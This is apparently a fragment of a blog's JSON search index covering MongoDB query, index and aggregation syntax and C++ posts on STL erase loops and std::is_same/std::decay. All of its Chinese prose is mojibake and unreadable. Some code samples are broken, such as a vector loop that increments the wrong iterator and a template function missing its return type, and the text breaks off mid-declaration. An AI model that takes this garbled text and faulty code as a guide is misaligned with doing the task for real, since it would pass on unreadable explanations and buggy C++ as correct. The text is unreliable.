æ–¹æ³•\n\næˆ‘ä»¬é™¤äº†å¯ä»¥ä½¿ç”¨limit()æ–¹æ³•æ¥è¯»å–æŒ‡å®šæ•°é‡çš„æ•°æ®å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨skip()æ–¹æ³•æ¥è·³è¿‡æŒ‡å®šæ•°é‡çš„æ•°æ®ï¼Œskipæ–¹æ³•åŒæ ·æ¥å—ä¸€ä¸ªæ•°å­—å‚æ•°ä½œä¸ºè·³è¿‡çš„è®°å½•æ¡æ•°ã€‚\n\nskip() æ–¹æ³•è„šæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)\n```\n\nçœ‹ä¸‹é¢çš„è¿™ä¸ªä¾‹å­, è¯´æ˜findæ²¡æœ‰æ¡ä»¶, ç»“æœåé¢å­—æ®µæ˜¾ç¤ºtitle, _idä¸æ˜¾ç¤º, \n\n```\n>db.col.find({},{\"title\":1,_id:0}).limit(1).skip(1)\n{ \"title\" : \"Java æ•™ç¨‹\" }\n>\n```\n\n\n+ Sort()æ–¹æ³•\nåœ¨MongoDBä¸­ä½¿ç”¨ä½¿ç”¨sort()æ–¹æ³•å¯¹æ•°æ®è¿›è¡Œæ’åºï¼Œsort()æ–¹æ³•å¯ä»¥é€šè¿‡å‚æ•°æŒ‡å®šæ’åºçš„å­—æ®µï¼Œå¹¶ä½¿ç”¨ 1 å’Œ -1 æ¥æŒ‡å®šæ’åºçš„æ–¹å¼ï¼Œå…¶ä¸­ 1 ä¸ºå‡åºæ’åˆ—ï¼Œè€Œ-1æ˜¯ç”¨äºé™åºæ’åˆ—ã€‚\n\n\nsort()æ–¹æ³•åŸºæœ¬è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n>db.COLLECTION_NAME.find().sort({KEY:1})\n```\n\n```\n>db.col.find({},{\"title\":1,_id:0}).sort({\"likes\":-1})\n{ \"title\" : \"PHP æ•™ç¨‹\" }\n{ \"title\" : \"Java æ•™ç¨‹\" }\n{ \"title\" : \"MongoDB æ•™ç¨‹\" }\n>\n```\n\n### ç´¢å¼•:\nensureIndex() æ–¹æ³•\nensureIndex()æ–¹æ³•åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n>db.COLLECTION_NAME.ensureIndex({KEY:1})\n```\nè¯­æ³•ä¸­ Key å€¼ä¸ºä½ è¦åˆ›å»ºçš„ç´¢å¼•å­—æ®µï¼Œ1ä¸ºæŒ‡å®šæŒ‰å‡åºåˆ›å»ºç´¢å¼•ï¼Œå¦‚æœä½ æƒ³æŒ‰é™åºæ¥åˆ›å»ºç´¢å¼•æŒ‡å®šä¸º-1å³å¯ã€‚\n\nensureIndex() æ–¹æ³•ä¸­ä½ ä¹Ÿå¯ä»¥è®¾ç½®ä½¿ç”¨å¤šä¸ªå­—æ®µåˆ›å»ºç´¢å¼•ï¼ˆå…³ç³»å‹æ•°æ®åº“ä¸­ç§°ä½œå¤åˆç´¢å¼•ï¼‰ã€‚\n\n```\n>db.col.ensureIndex({\"title\":1,\"description\":-1})\n>\n```\n\nensureIndex() æ¥æ”¶å¯é€‰å‚æ•°ï¼Œå¯é€‰å‚æ•°åˆ—è¡¨å¦‚ä¸‹ï¼š\n\n```\nParameter Type Description\nbackground Boolean å»ºç´¢å¼•è¿‡ç¨‹ä¼šé˜»å¡å…¶å®ƒæ•°æ®åº“æ“ä½œï¼Œbackgroundå¯æŒ‡å®šä»¥åå°æ–¹å¼åˆ›å»ºç´¢å¼•ï¼Œå³å¢åŠ  \"background\" å¯é€‰å‚æ•°ã€‚ \"background\" é»˜è®¤å€¼ä¸ºfalseã€‚\nunique Boolean å»ºç«‹çš„ç´¢å¼•æ˜¯å¦å”¯ä¸€ã€‚æŒ‡å®šä¸ºtrueåˆ›å»ºå”¯ä¸€ç´¢å¼•ã€‚é»˜è®¤å€¼ä¸ºfalse.\nname string ç´¢å¼•çš„åç§°ã€‚å¦‚æœæœªæŒ‡å®šï¼ŒMongoDBçš„é€šè¿‡è¿æ¥ç´¢å¼•çš„å­—æ®µåå’Œæ’åºé¡ºåºç”Ÿæˆä¸€ä¸ªç´¢å¼•åç§°ã€‚\ndropDups Boolean åœ¨å»ºç«‹å”¯ä¸€ç´¢å¼•æ—¶æ˜¯å¦åˆ é™¤é‡å¤è®°å½•,æŒ‡å®š true åˆ›å»ºå”¯ä¸€ç´¢å¼•ã€‚é»˜è®¤å€¼ä¸º false.\nsparse Boolean å¯¹æ–‡æ¡£ä¸­ä¸å­˜åœ¨çš„å­—æ®µæ•°æ®ä¸å¯ç”¨ç´¢å¼•ï¼›è¿™ä¸ªå‚æ•°éœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œå¦‚æœè®¾ç½®ä¸ºtrueçš„è¯ï¼Œåœ¨ç´¢å¼•å­—æ®µä¸­ä¸ä¼šæŸ¥è¯¢å‡ºä¸åŒ…å«å¯¹åº”å­—æ®µçš„æ–‡æ¡£.ã€‚é»˜è®¤å€¼ä¸º false.\nexpireAfterSeconds integer æŒ‡å®šä¸€ä¸ªä»¥ç§’ä¸ºå•ä½çš„æ•°å€¼ï¼Œå®Œæˆ TTLè®¾å®šï¼Œè®¾å®šé›†åˆçš„ç”Ÿå­˜æ—¶é—´ã€‚\nv index version ç´¢å¼•çš„ç‰ˆæœ¬å·ã€‚é»˜è®¤çš„ç´¢å¼•ç‰ˆæœ¬å–å†³äºmongodåˆ›å»ºç´¢å¼•æ—¶è¿è¡Œçš„ç‰ˆæœ¬ã€‚\nweights document ç´¢å¼•æƒé‡å€¼ï¼Œæ•°å€¼åœ¨ 1 åˆ° 99,999 ä¹‹é—´ï¼Œè¡¨ç¤ºè¯¥ç´¢å¼•ç›¸å¯¹äºå…¶ä»–ç´¢å¼•å­—æ®µçš„å¾—åˆ†æƒé‡ã€‚\ndefault_language string å¯¹äºæ–‡æœ¬ç´¢å¼•ï¼Œè¯¥å‚æ•°å†³å®šäº†åœç”¨è¯åŠè¯å¹²å’Œè¯å™¨çš„è§„åˆ™çš„åˆ—è¡¨ã€‚ é»˜è®¤ä¸ºè‹±è¯­\nlanguage_override string å¯¹äºæ–‡æœ¬ç´¢å¼•ï¼Œè¯¥å‚æ•°æŒ‡å®šäº†åŒ…å«åœ¨æ–‡æ¡£ä¸­çš„å­—æ®µåï¼Œè¯­è¨€è¦†ç›–é»˜è®¤çš„languageï¼Œé»˜è®¤å€¼ä¸º language.\n```\n\n\nåœ¨åå°åˆ›å»ºç´¢å¼•ï¼š\n\n```\ndb.values.ensureIndex({open: 1, close: 1}, {background: true})\n```\né€šè¿‡åœ¨åˆ›å»ºç´¢å¼•æ—¶åŠ background:true çš„é€‰é¡¹ï¼Œè®©åˆ›å»ºå·¥ä½œåœ¨åå°æ‰§è¡Œ\n\n\n\n### èšåˆ:\nMongoDBä¸­èšåˆ(aggregate)ä¸»è¦ç”¨äºå¤„ç†æ•°æ®(è¯¸å¦‚ç»Ÿè®¡å¹³å‡å€¼,æ±‚å’Œç­‰)ï¼Œå¹¶è¿”å›è®¡ç®—åçš„æ•°æ®ç»“æœã€‚æœ‰ç‚¹ç±»ä¼¼sqlè¯­å¥ä¸­çš„ count(*)ã€‚\n\naggregate() æ–¹æ³•çš„åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n>db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION)\n```\n\n```\n> db.col.find().pretty()\n{\n\t\"_id\" : ObjectId(\"58dc7efc70d2b5b8821b6184\"),\n\t\"title\" : \"MongoDB Overview\",\n\t\"description\" : \"MongoDB is no sql database\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 100\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fcb70d2b5b8821b6185\"),\n\t\"title\" : \"NoSQL Overview\",\n\t\"description\" : \"No sql database is very fast\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 10\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fe370d2b5b8821b6186\"),\n\t\"title\" : \"Neo4j Overview\",\n\t\"description\" : \"Neo4j is no sql database\",\n\t\"by_user\" : \"Neo4j\",\n\t\"url\" : \"http://www.neo4j.com\",\n\t\"tags\" : [\n\t\t\"neo4j\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 750\n}\n```\n\n```\n> db.col.aggregate([{$group:{_id:\"$by_user\", num_tutorial:{$sum:1}}}])\n{ \"_id\" : \"Neo4j\", \"num_tutorial\" : 1 }\n{ \"_id\" : \"w3cschool.cc\", \"num_tutorial\" : 2 }\n>\n```\nä»¥ä¸Šå®ä¾‹ç±»ä¼¼sqlè¯­å¥ï¼š select by_user, count(*) from mycol group by by_user\n\n//ä¸Šé¢çš„_idä¸èƒ½å˜, åé¢çš„å­—æ®µå¯ä»¥è‡ªå·±æŒ‡å®š\n\nä¸‹è¡¨å±•ç¤ºäº†ä¸€äº›èšåˆçš„è¡¨è¾¾å¼:\n\n```\nè¡¨è¾¾å¼ æè¿° å®ä¾‹\n$sum è®¡ç®—æ€»å’Œã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$sum : \"$likes\"}}}])\n$avg è®¡ç®—å¹³å‡å€¼ db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$avg : \"$likes\"}}}])\n$min è·å–é›†åˆä¸­æ‰€æœ‰æ–‡æ¡£å¯¹åº”å€¼å¾—æœ€å°å€¼ã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$min : \"$likes\"}}}])\n$max è·å–é›†åˆä¸­æ‰€æœ‰æ–‡æ¡£å¯¹åº”å€¼å¾—æœ€å¤§å€¼ã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$max : \"$likes\"}}}])\n$push åœ¨ç»“æœæ–‡æ¡£ä¸­æ’å…¥å€¼åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$push: \"$url\"}}}])\n$addToSet åœ¨ç»“æœæ–‡æ¡£ä¸­æ’å…¥å€¼åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œä½†ä¸åˆ›å»ºå‰¯æœ¬ã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$addToSet : \"$url\"}}}])\n$first æ ¹æ®èµ„æºæ–‡æ¡£çš„æ’åºè·å–ç¬¬ä¸€ä¸ªæ–‡æ¡£æ•°æ®ã€‚ db.mycol.aggregate([{$group : {_id : \"$by_user\", first_url : {$first : \"$url\"}}}])\n$last æ ¹æ®èµ„æºæ–‡æ¡£çš„æ’åºè·å–æœ€åä¸€ä¸ªæ–‡æ¡£æ•°æ® db.mycol.aggregate([{$group : {_id : \"$by_user\", last_url : {$last : \"$url\"}}}])\n```\n\n\n### ç®¡é“\n\n  â— $projectï¼šä¿®æ”¹è¾“å…¥æ–‡æ¡£çš„ç»“æ„ã€‚å¯ä»¥ç”¨æ¥é‡å‘½åã€å¢åŠ æˆ–åˆ é™¤åŸŸï¼Œä¹Ÿå¯ä»¥ç”¨äºåˆ›å»ºè®¡ç®—ç»“æœä»¥åŠåµŒå¥—æ–‡æ¡£ã€‚\n\n  â— $matchï¼šç”¨äºè¿‡æ»¤æ•°æ®ï¼Œåªè¾“å‡ºç¬¦åˆæ¡ä»¶çš„æ–‡æ¡£ã€‚$matchä½¿ç”¨MongoDBçš„æ ‡å‡†æŸ¥è¯¢æ“ä½œã€‚\n\n  â— $limitï¼šç”¨æ¥é™åˆ¶MongoDBèšåˆç®¡é“è¿”å›çš„æ–‡æ¡£æ•°ã€‚\n\n  â— $skipï¼šåœ¨èšåˆç®¡é“ä¸­è·³è¿‡æŒ‡å®šæ•°é‡çš„æ–‡æ¡£ï¼Œå¹¶è¿”å›ä½™ä¸‹çš„æ–‡æ¡£ã€‚\n\n  â— $unwindï¼šå°†æ–‡æ¡£ä¸­çš„æŸä¸€ä¸ªæ•°ç»„ç±»å‹å­—æ®µæ‹†åˆ†æˆå¤šæ¡ï¼Œæ¯æ¡åŒ…å«æ•°ç»„ä¸­çš„ä¸€ä¸ªå€¼ã€‚\n\n  â— $groupï¼šå°†é›†åˆä¸­çš„æ–‡æ¡£åˆ†ç»„ï¼Œå¯ç”¨äºç»Ÿè®¡ç»“æœã€‚\n\n  â— $sortï¼šå°†è¾“å…¥æ–‡æ¡£æ’åºåè¾“å‡ºã€‚\n\n  â— $geoNearï¼šè¾“å‡ºæ¥è¿‘æŸä¸€åœ°ç†ä½ç½®çš„æœ‰åºæ–‡æ¡£ã€‚\n\n\n1ã€$projectå®ä¾‹\n\n```\ndb.article.aggregate(\n    { $project : {\n        title : 1 ,\n        author : 1 ,\n    }}\n );\n```\nè¿™æ ·çš„è¯ç»“æœä¸­å°±åªè¿˜æœ‰_id,tilteå’Œauthorä¸‰ä¸ªå­—æ®µäº†ï¼Œé»˜è®¤æƒ…å†µä¸‹_idå­—æ®µæ˜¯è¢«åŒ…å«çš„ï¼Œå¦‚æœè¦æƒ³ä¸åŒ…å«_idè¯å¯ä»¥è¿™æ ·:\n\n```\ndb.article.aggregate(\n    { $project : {\n        _id : 0 ,\n        title : 1 ,\n        author : 1\n    }});\n```\n```\n> db.article.find()\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\", \"age\" : 123 }\n> db.article.aggregate(     { $project : {      name:1    }}  );\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n> db.article.find({}, {name:1})\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n```\n2.$matchå®ä¾‹\n\n```\ndb.articles.aggregate( [\n                        { $match : { score : { $gt : 70, $lte : 90 } } },\n                        { $group: { _id: null, count: { $sum: 1 } } }\n                       ] );\n```\n$matchç”¨äºè·å–åˆ†æ•°å¤§äº70å°äºæˆ–ç­‰äº90è®°å½•ï¼Œç„¶åå°†ç¬¦åˆæ¡ä»¶çš„è®°å½•é€åˆ°ä¸‹ä¸€é˜¶æ®µ$groupç®¡é“æ“ä½œç¬¦è¿›è¡Œå¤„ç†ã€‚\n\n3.$skipå®ä¾‹\n\n```\ndb.article.aggregate(\n    { $skip : 5 });\n```\nç»è¿‡$skipç®¡é“æ“ä½œç¬¦å¤„ç†åï¼Œå‰äº”ä¸ªæ–‡æ¡£è¢«\"è¿‡æ»¤\"æ‰ã€‚\n\n\n### æ•°æ®åº“å¼•ç”¨:\n\nDBRefçš„å½¢å¼ï¼š\n\n```\n{ $ref : , $id : , $db :  }\nä¸‰ä¸ªå­—æ®µè¡¨ç¤ºçš„æ„ä¹‰ä¸ºï¼š\n  â— $refï¼šé›†åˆåç§°\n  â— $idï¼šå¼•ç”¨çš„id\n  â— $db:æ•°æ®åº“åç§°ï¼Œå¯é€‰å‚æ•°\n```\n\naddress DBRef å­—æ®µæŒ‡å®šäº†å¼•ç”¨çš„åœ°å€æ–‡æ¡£æ˜¯åœ¨ address_home é›†åˆä¸‹çš„ w3cschoolcc æ•°æ®åº“ï¼Œid ä¸º 534009e4d852427820000002ã€‚\nä»¥ä¸‹ä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡æŒ‡å®š $ref å‚æ•°ï¼ˆaddress_home é›†åˆï¼‰æ¥æŸ¥æ‰¾é›†åˆä¸­æŒ‡å®šidçš„ç”¨æˆ·åœ°å€ä¿¡æ¯ï¼š\n\n```\n>var user = db.users.findOne({\"name\":\"Tom Benzamin\"})\n>var dbRef = user.address\n>db[dbRef.$ref].findOne({\"_id\":(dbRef.$id)})\n```\n\n\n### ä½¿ç”¨ explain()\nexplain æ“ä½œæä¾›äº†æŸ¥è¯¢ä¿¡æ¯ï¼Œä½¿ç”¨ç´¢å¼•åŠæŸ¥è¯¢ç»Ÿè®¡ç­‰ã€‚æœ‰åˆ©äºæˆ‘ä»¬å¯¹ç´¢å¼•çš„ä¼˜åŒ–ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ users é›†åˆä¸­åˆ›å»º gender å’Œ user_name çš„ç´¢å¼•ï¼š\n\n```\ndb.users.find({gender:\"M\"},{user_name:1,_id:0}).explain()\n```\n\n\n### ä½¿ç”¨ hint()\nè™½ç„¶MongoDBæŸ¥è¯¢ä¼˜åŒ–å™¨ä¸€èˆ¬å·¥ä½œçš„å¾ˆä¸é”™ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä½¿ç”¨ hint æ¥å¼ºåˆ¶ MongoDB ä½¿ç”¨ä¸€ä¸ªæŒ‡å®šçš„ç´¢å¼•ã€‚\nè¿™ç§æ–¹æ³•æŸäº›æƒ…å½¢ä¸‹ä¼šæå‡æ€§èƒ½ã€‚ ä¸€ä¸ªæœ‰ç´¢å¼•çš„ collection å¹¶ä¸”æ‰§è¡Œä¸€ä¸ªå¤šå­—æ®µçš„æŸ¥è¯¢(ä¸€äº›å­—æ®µå·²ç»ç´¢å¼•äº†)ã€‚\nå¦‚ä¸‹æŸ¥è¯¢å®ä¾‹æŒ‡å®šäº†ä½¿ç”¨ gender å’Œ user_name ç´¢å¼•å­—æ®µæ¥æŸ¥è¯¢ï¼š\n\n```\n>db.users.find({gender:\"M\"},{user_name:1,_id:0}).hint({gender:1,user_name:1})\n```\n\n","tags":["mongodb"],"categories":["sql"]},{"title":"c++stlå®¹å™¨å¾ªç¯earseç”¨æ³•","url":"%2Fp%2F6556ac6a.html","content":"\n### vector deque\nåœ¨ä½¿ç”¨ vectorã€dequeéå†åˆ é™¤å…ƒç´ æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡eraseçš„è¿”å›å€¼æ¥è·å–ä¸‹ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼š\n\n```\n      std::vector< int> Vec;\n      std::vector< int>::iterator itVec;\n      for( itVec = Vec.begin(); itVec != Vec.end(); )\n      {\n            if( WillDelete( *itVec) )\n            {\n                 itVec = Vec.erase( itVec);\n            }\n            else\n               itList++;\n      }\n```\n<!-- more -->\n\n### list set map \nåœ¨ ä½¿ç”¨ listã€set æˆ– mapéå†åˆ é™¤æŸäº›å…ƒç´ æ—¶å¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               itList = List.erase( itList);\n            }\n            else\n               itList++;\n      }\n```\n\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               List.erase( itList++);\n            }\n            else\n               itList++;\n      }\n```\n","tags":["c++"],"categories":["c++"]},{"title":"c++11çš„æ¨¡æ¿ç±»å‹åˆ¤æ–­std::is_sameå’Œstd::decay","url":"%2Fp%2F1e4be646.html","content":"\né—®é¢˜æå‡ºï¼šæœ‰ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼Œå‡½æ•°åœ¨å¤„ç†intå‹å’Œdoubleå‹æ—¶éœ€è¦è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ï¼Œé‚£ä¹ˆæ€ä¹ˆåœ¨ç¼–è¯‘æœŸçŸ¥é“ä¼ å…¥çš„å‚æ•°çš„æ•°æ®ç±»å‹æ˜¯intå‹è¿˜æ˜¯doubleå‹å‘¢ï¼Ÿ \nå¦‚ï¼š\n\n\n```cpp\n#include <iostream>\ntemplate <typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    //do something check data type\n\t//std::cout<< out put the type\n}\n```\n\nè¿™é‡Œå°±éœ€è¦ç”¨åˆ°C++11çš„type_traitså¤´æ–‡ä»¶äº†ï¼Œtype_traitså¤´æ–‡ä»¶å®šä¹‰äº†å¾ˆå¤šç±»å‹æ£€æŸ¥ç›¸å…³çš„æ–¹æ³•ï¼Œä¸Šé¢çš„ä¾‹å­å…·ä½“ç”¨åˆ°äº†å…¶ä¸­ä¸¤ä¸ªç»“æ„ï¼š\n\n## std::is_same åˆ¤æ–­ç±»å‹æ˜¯å¦ä¸€è‡´\n\nä½äºå¤´æ–‡ä»¶`<type_traits>`ä¸­\nè¿™ä¸ªç»“æ„ä½“ä½œç”¨å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸¤ä¸ªä¸€æ ·çš„ç±»å‹ä¼šè¿”å›true\n\n```cpp\nbool isInt = std::is_same<int, int>::value; //ä¸ºtrue\n```\n\nä¸‹é¢æ˜¯å®˜æ–¹çš„ä¾‹å­ï¼š\n\n```cpp\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\nvoid print_separator()\n{\n    std::cout << \"-----\\n\";\n}\n\nint main()\n{\n    std::cout << std::boolalpha;\n\n    std::cout << std::is_same<int, int32_t>::value << '\\n';   // true\n    std::cout << std::is_same<int, int64_t>::value << '\\n';   // false\n    std::cout << std::is_same<float, int32_t>::value << '\\n'; // false\n\n    print_separator();\n\n    std::cout << std::is_same<int, int>::value << \"\\n\";          // true\n    std::cout << std::is_same<int, unsigned int>::value << \"\\n\"; // false\n    std::cout << std::is_same<int, signed int>::value << \"\\n\";   // true\n\n    print_separator();\n\n    // unlike other types 'char' is not 'unsigned' and not 'signed'\n    std::cout << std::is_same<char, char>::value << \"\\n\";          // true\n    std::cout << std::is_same<char, unsigned char>::value << \"\\n\"; // false\n    std::cout << std::is_same<char, signed char>::value << \"\\n\";   // false\n}\n```\n\né€šè¿‡std::is_sameå³å¯åˆ¤æ–­ä¸¤ä¸ªç±»å‹æ˜¯å¦ä¸€æ ·ï¼Œç‰¹åˆ«åœ¨æ¨¡æ¿é‡Œé¢ï¼Œåœ¨ä¸æ¸…æ¥šæ¨¡æ¿çš„å‚æ•°æ—¶ï¼Œæ­¤åŠŸèƒ½å¯ä»¥å¯¹ä¸€äº›ç‰¹å®šçš„å‚æ•°ç±»å‹è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ã€‚\n\n<!-- more -->\n\n> è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œå¤§å®¶æ˜¯å¦é€šè¿‡std::is_sameå‘ç°ï¼Œcharæ—¢ä¸æ˜¯unsigned charä¹Ÿä¸æ˜¯signed charï¼Œcharå°±æ˜¯charï¼Œè¿™å’Œintæ˜¯signed intçš„ç¼©å†™æ˜¯ä¸ä¸€æ ·çš„ï¼Œcharçš„è¡¨è¾¾èŒƒå›´å¯èƒ½ç­‰åŒäºsigned charï¼Œä¹Ÿå¯èƒ½ç­‰åŒäºunsigned charï¼Œå–å†³äºç¼–è¯‘å™¨ï¼Œä¸€èˆ¬æ˜¯ç­‰åŒäºsigned charï¼Œä½†è¿™ä¸ªä»…ä»…æ˜¯èŒƒå›´ç­‰åŒï¼Œå°±åƒ32ä½ä¸Šintå’ŒlongèŒƒå›´æ˜¯ä¸€æ ·çš„ï¼Œä½†ä¸æ˜¯åŒä¸€ä¸ªç±»å‹ã€‚\n> \n> å› ä¸ºç”¨é€”ä¸åŒï¼Œcharç”¨äºè¡¨è¾¾å­—ç¬¦ï¼Œç†è®ºä¸Šä¸åº”è¯¥å…³å¿ƒå…¶æ­£è´Ÿçš„å®ç°ï¼Œè€Œsigned char å’Œ unsigned char ç”¨äºè¡¨è¾¾æ•°å€¼ï¼Œæˆ–å¯ç§»æ¤çš„charã€‚\n\n\nå›åˆ°æ­£æ–‡ï¼Œstd::is_sameå¯ä»¥åˆ¤æ–­ä¸¤ç§ç±»ä¼¼æ˜¯å¦ä¸€æ ·ï¼Œé‚£ä¹ˆç”¨åœ¨æ¨¡æ¿é‡Œå°±æ˜¯åˆ©å™¨äº†ï¼Œæœ¬ä½ä¸€å¼€å§‹æåˆ°çš„é‚£ä¸ªé—®é¢˜å°±å¯ä»¥è¿™æ ·å†™ï¼š\n\n```cpp\n#include <iostream>\ntemplate<typename TYPE>\ntypeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\";\n        //do something int \n    }\n    else\n    {\n        //.........\n    }\n}\n```\n\nçœ‹ä¼¼å¾ˆç¾å¥½ï¼Œå†çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š\n\n```cpp\n// is_same example\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\ntypedef int integer_type;\nstruct A { int x,y; };\nstruct B { int x,y; };\ntypedef A C;\n\nint main() {\n      std::cout << std::boolalpha;\n      std::cout << \"is_same:\" << std::endl;\n      std::cout << \"int, const int: \" << std::is_same<int, const int>::value << std::endl;//false\n      std::cout << \"int, int&: \" << std::is_same<int, int&>::value << std::endl;//false\n      std::cout << \"int, const int&: \" << std::is_same<int, const int&>::value << std::endl;//false\n      std::cout << \"int, integer_type: \" << std::is_same<int, integer_type>::value << std::endl;//true\n      std::cout << \"A, B: \" << std::is_same<A,B>::value << std::endl;//false\n      std::cout << \"A, C: \" << std::is_same<A,C>::value << std::endl;//true\n      std::cout << \"signed char, std::int8_t: \" << std::is_same<signed char,std::int8_t>::value << std::endl;//true\n      return 0;\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nis_same:\nint, const int: false\nint, int&: false\nint, const int&: false\nint, integer_type: true\nA, B: false\nA, C: true\nsigned char, std::int8_t: true\n```\n\nå¯ä»¥å‘ç°std::is_sameçš„åˆ¤æ–­æ˜¯å¾ˆä¸¥æ ¼çš„,å†çœ‹ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­ï¼š\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n    const int& e = d[7];\n    typeCheck(a);//int type\n    typeCheck(b);//int type\n    typeCheck(c);//int type\n    typeCheck(d[7]);//int type\n    typeCheck(e);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nint type\nint type\nint type\nint type\nint type\nint type\n```\n\næµ‹è¯•åå‘ç°ï¼Œè™½ç„¶å˜é‡b,c, eä½¿ç”¨çš„æ˜¯å¼•ç”¨ï¼Œstd::is_sameé‚£ä¹ˆä¸¥æ ¼ä¸ºä»€ä¹ˆæ˜¯int_typeå‘¢? å› ä¸ºåœ¨å†™æ¨¡æ¿å‡½æ•°æ—¶ï¼Œç»å¸¸ä¼šå¼ºåˆ¶æŒ‡å®šconstå¼•ç”¨è¿›è¡Œä¼ å‚ï¼Œä»¥å…è¿›è¡Œæ•°æ®æ‹·è´ï¼Œè¿™æ—¶å€™is_sameå°±åšå‡ºäº†ç›¸ç­‰çš„åˆ¤æ–­.\n\n\n\n> å¦‚æœæˆ‘ä»¬æ˜¾ç¤ºçš„æŒ‡å®šæ¨¡æ¿å‚æ•°ç±»å‹æ—¶æƒ…å†µæœ‰ä¸ä¸€æ ·äº†ï¼š\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);        //int type\n    typeCheck<const int&>(b);//other type\n    typeCheck<int &>(c);        //other type\n    typeCheck<const int&>(d[7]);//other type\n    typeCheck(8);                //int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\nè¾“å‡ºï¼š\n\n```cpp\nint type\nother type\nother type\nother type\nint type\n```\nç¬é—´ç»“æœå°±ä¸ä¸€æ ·äº†ï¼Œè¿™å¾ˆå¥½äº†è§£ï¼Œä»ä¸Šé¢å¯çŸ¥é“ï¼Œstd::is_sameå¯¹int\\ const int\\ int &\\ const int& ç­‰éƒ½æ˜¯åŒºåˆ«å¯¹å¾…çš„.\n\n\n> ä½†æ˜¯æœ‰æ—¶å€™å…¶å®æˆ‘ä»¬è¿˜æ˜¯å¸Œæœ›TYPEå’Œconst TYPE& æ˜¯èƒ½è®¤ä¸ºæ˜¯ä¸€æ ·çš„ï¼Œè¿™æ—¶å°±éœ€è¦std::decayè¿›è¡Œé€€åŒ–å¤„ç†\n\n\n## std::decay é€€åŒ–ç±»å‹çš„ä¿®é¥°\n\nstd::decayå°±æ˜¯å¯¹ä¸€ä¸ªç±»å‹è¿›è¡Œé€€åŒ–å¤„ç†ï¼Œä»–çš„å®ç°å¦‚ä¸‹:\n\n```cpp\ntemplate< class T >\nstruct decay {\nprivate:\n    typedef typename 